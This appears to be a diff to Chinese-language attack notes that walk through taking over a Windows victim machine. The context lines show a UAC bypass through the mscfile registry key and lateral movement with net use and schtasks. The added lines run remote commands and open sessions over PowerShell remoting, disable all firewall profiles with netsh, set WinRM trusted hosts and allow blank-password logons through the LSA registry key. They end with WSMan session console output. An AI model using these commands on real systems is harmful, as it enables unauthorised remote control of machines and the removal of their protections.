@@ -51,4 +51,83 @@ reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /ve /f /REG_SZ /d cmd.e
 1.利用net use网络连接共享文件夹
 2.利用copy拷贝批处理文件到被攻击机的共享文件夹
 3.利用schtasks /create加schtasks /run创建一个执行该批处理文件的计划任务
-mysql -h 206.119.78.153 -p 3306
+
+攻击机的进攻：
+$cred=get-credential
+然后输入你的凭据。
+远程调用一条命令invoke-command -computername 192.168.1.17 -credential $cred -command {msg * "hello"}
+用法把192.168.1.17替换为被攻击机的ip，并把msg * "hello"替换为你想执行的命令。
+enter-pssession -computername 192.168.1.17 -credential administrator然后输入你的凭据，administrator是被攻击机的
+用户名，192.168.1.17是被攻击的ip，这段命令会建立一个会话.
+想要退出输入exit-pssession
+
+netsh advfirewall set currentprofile state off或有一句更好的netsh advfirewall set allprofiles state off。它们都可以
+关闭被攻击机的防火墙
+然后新打开一个窗口，输入mstsc /console或直接mstsc选择要连接的运程桌面。
+被攻击机的配置：
+enable-psremoting -force 强制开启winrm
+winrm quickconfig cmd中的，powershell中是set-wsmanquickconfig
+1set-item wsman:\localhost\client\trustedhosts -value "攻击机的ip" 
+get-item wsman:\localhost\client\trustedhosts
+如果value处为攻击机的ip表示设置成功
+test-path -path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN"测试该路径是否存在
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Client /v trusted_hosts /t REG_SZ /d "攻击机ip" /f
+效果同1
+打开regedit注册表编辑器，转到HEKY_LOCAL_MACHINE/SYSTEM/CURRENTCONTROLSET/CONTROL/LSA
+选中limitblankpassworduse修改其数据为0
+输入sysdm.cpl开启远程协助
+新建一条防火墙规则：
+set-netfirewallrule -name "名称" -remoteaddress "IP地址+子网掩码"
+get-netfirewallrule | select-object Name | findstr "名称"
+enable-netfirewallrule -Name "名称"启用该防火墙规则
+PS C:\Users\Administrator> cd wsman:
+PS WSMan:\> ls
+
+
+   WSManConfig:
+
+ComputerName                                  Type
+------------                                  ----
+localhost                                     Container
+
+
+PS WSMan:\> cd c:
+PS C:\Users\Administrator> connect-WsMan -ComputerName "192.168.1.5" -Credential Administrator
+PS C:\Users\Administrator> cd wsman:
+PS WSMan:\> ls
+
+
+   WSManConfig:
+
+ComputerName                                  Type
+------------                                  ----
+localhost                                     Container
+192.168.1.5                                   Container
+
+
+PS WSMan:\> cd 192.168.1.5
+PS WSMan:\192.168.1.5>
+以上是路过流程了
+PS C:\Users\Administrator> $cred=get-credential administrator
+PS C:\Users\Administrator> connect-wsman -computername 192.168.1.5 -credential $cred
+PS C:\Users\Administrator> cd wsman:
+PS WSMan:\> ls
+
+
+   WSManConfig:
+
+ComputerName                                  Type
+------------                                  ----
+localhost                                     Container
+192.168.1.5                                   Container
+
+
+PS WSMan:\> disconnect-wsman -computer 192.168.1.5断开连接
+PS WSMan:\> ls
+
+
+   WSManConfig:
+
+ComputerName                                  Type
+------------                                  ----
+localhost                                     Container
